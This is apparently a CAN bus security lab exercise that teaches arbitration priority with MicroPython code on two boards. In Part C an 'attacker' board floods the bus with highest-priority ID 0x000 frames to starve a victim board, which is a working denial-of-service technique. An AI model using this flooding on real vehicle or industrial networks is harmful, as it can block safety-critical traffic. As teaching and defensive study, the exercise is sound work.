# Challenge 2: Bus Arbitration Race
**Difficulty:** 🟢 Easy | **Time:** 20 min | **Boards:** 2

## 🎯 Objective
Understand how CAN arbitration works — the mechanism that decides which node "wins" when two nodes transmit simultaneously. Exploit priority to always win the bus.

## 📖 Background
CAN uses **non-destructive bitwise arbitration**: when two nodes transmit at the same time, the one with the **lower ID wins** (dominant bit = 0 beats recessive bit = 1). The loser detects it lost and backs off automatically. This is why safety-critical messages use low IDs.

## 🔬 Exercise

### Setup
- **Board A (Attacker):** Connected via USB to your PC, REPL open
- **Board B (Victim):** Connected via USB to another PC (or second terminal)
- Both boards connected on the same CAN bus (CAN-H, CAN-L, GND)

### Part A: Priority demonstration
**Board B — sends a medium-priority frame every 100ms:**
```python
from rp2 import CAN, CANFrame, CANID
c = CAN()
f = CANFrame(CANID(0x300), data=b'victim')

while True:
    try:
        c.send_frame(f)
    except:
        pass
    from utime import sleep_ms
    sleep_ms(100)
```

**Board A — sends a high-priority frame:**
```python
from rp2 import CAN, CANFrame, CANID
c = CAN()
f_high = CANFrame(CANID(0x010), data=b'attacker')
c.send_frame(f_high)
```

**Observe:** Board A's frame always gets through first. Board B's frame is delayed but not lost.

### Part B: Priority inversion experiment
**Board A — try different IDs and observe who wins:**
```python
from rp2 import CAN, CANFrame, CANID
from utime import sleep_ms

c = CAN()

# Try these IDs — which ones beat Board B's 0x300?
test_ids = [0x001, 0x100, 0x2FF, 0x300, 0x301, 0x7FF]

for test_id in test_ids:
    f = CANFrame(CANID(test_id), data=b'test')
    c.send_frame(f)
    sleep_ms(50)
    print(f"Sent ID 0x{test_id:03X}")
```

**Questions:**
1. Which IDs win against 0x300? Which lose?
2. What happens when both boards send the same ID (0x300)?
3. What is the highest-priority possible CAN ID? The lowest?

### Part C: Flood the bus with highest priority
**Board A — monopolize the bus:**
```python
from rp2 import CAN, CANFrame, CANID

c = CAN()
# ID 0x000 is the highest priority possible
f_king = CANFrame(CANID(0x000), data=b'I am king')

# Send back-to-back — no sleep
i = 0
while i < 1000:
    try:
        c.send_frame(f_king)
        i += 1
    except:
        pass
print(f"Sent {i} frames")
```

**On Board B — try to send anything:**
```python
from rp2 import CAN, CANFrame, CANID
c = CAN()
f = CANFrame(CANID(0x300), data=b'help')
c.send_frame(f)
# Does this frame ever get sent?
```

**Questions:**
1. Can Board B send anything while Board A floods with ID 0x000?
2. Is this a denial-of-service attack? How would you defend against it?
3. What's the difference between this and a real DoS (error frame injection)?

### Part D: Measure arbitration latency
```python
from rp2 import CAN, CANFrame, CANID
from utime import ticks_us, ticks_diff

c = CAN()
f = CANFrame(CANID(0x123), data=b'timing')

start = ticks_us()
c.send_frame(f)
# Wait for transmit timestamp
while f.get_timestamp() is None:
    pass
end = ticks_us()
print(f"Transmit took {ticks_diff(end, start)} microseconds")
```

## 📝 What to Share
- Which IDs win arbitration and why
- Whether you could starve Board B completely
- Your thoughts on how priority-based DoS differs from error-based DoS

## 🏆 Stretch
- [ ] Calculate the theoretical maximum bus utilization (frames/sec) at 500 kbps
- [ ] Implement a "fair" scheduler that alternates between high and low priority frames
- [ ] What happens with extended (29-bit) IDs vs standard (11-bit) IDs in arbitration?
